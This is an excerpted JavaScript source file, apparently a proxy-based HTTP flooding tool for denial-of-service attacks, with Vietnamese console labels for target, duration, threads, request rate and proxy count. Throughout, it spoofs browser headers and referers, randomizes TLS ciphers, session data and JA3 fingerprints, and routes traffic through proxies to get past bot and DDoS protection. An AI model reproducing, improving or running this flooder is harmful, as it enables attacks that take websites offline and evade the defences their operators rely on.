...
if (cluster.isMaster) {
    console.log(`Mục tiêu: ${args.target.green}\nThời gian: ${args.time}s.yellow\nThread: ${args.threads.toString().yellow}\nRequest: ${args.Rate.toString().yellow}/s\nProxy: ${proxies.length.toString().yellow}`);
...
function runFlooder() {
    ...
    const generateHeaders = (browser) => {
        ...
        const headersMap = {
            ...
            safari: {
                ...
                "accept-encoding": Math.random() < 0.5 ? "gzip, deflate, br" : "gzip, deflate, lz4, br",
                "referer": ["https://www.google.com/", "https://www.apple.com/", "https://www.bing.com/", "https://duckduckgo.com/", "https://twitter.com/", "https://developer.apple.com/", "https://support.apple.com/", "https://news.ycombinator.com/"][Math.floor(Math.random() * 8)],
            ...
            mobile: {
                ...
                "accept-encoding": Math.random() < 0.5 ? "gzip, deflate, br" : "gzip, deflate, lz4, br",
                "referer": ["https://www.google.com/", "https://m.youtube.com/", "https://www.tiktok.com/", "https://m.facebook.com/", "https://mobile.twitter.com/", "https://m.instagram.com/", "https://m.wikipedia.org/", "https://www.reddit.com/r/all/", "https://www.quora.com/"][Math.floor(Math.random() * 9)],
            ...
            firefox: {
                ...
                "accept-encoding": Math.random() < 0.5 ? "gzip, deflate, br" : "gzip, deflate, lz4, br",
                "referer": ["https://www.google.com/", "https://m.youtube.com/", "https://www.reddit.com/", "https://github.com/", "https://stackoverflow.com/", "https://www.wikipedia.org/", "https://news.ycombinator.com/", "https://www.instagram.com/", "https://www.tiktok.com/"][Math.floor(Math.random() * 9)],
    ...
    Socker.HTTP(proxyOptions, async (connection, error) => {
        ...
        const tlsOptions = {
            ...
            ciphers: ciphers, // Updated to use dynamic ciphers with GREASE
            sigalgs: SignalsList,
            socket: connection,
            ecdhCurve: ecdhCurve,
            ...
            secureOptions: secureOptions | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_COMPRESSION,
            host: parsedTarget.host,
            servername: parsedTarget.host,
            sessionIdContext: crypto.randomBytes(32).toString('hex'),
            session: crypto.randomBytes(64),
            ticket: crypto.randomBytes(16)
        };
        ...
        function generateJA3Fingerprint() {
            const extensions = ['0', '5', '10', '11', '13', '15', '16', '18', '23', '27', '35', '43', '45', '51', '65281', '17513'];
            const shuffledCiphers = [cipper, ...cplist.filter(c => c !== cipper).sort(() => Math.random() - 0.5)].slice(0, Math.floor(Math.random() * 3) + 3);
            const shuffledExtensions = extensions.sort(() => Math.random() - 0.5).slice(0, Math.floor(Math.random() * 5) + 10);
            const ja3String = `772,${shuffledCiphers.join('-')},${shuffledExtensions.join('-')},${ecdhCurve.split(':').join('-')},`;
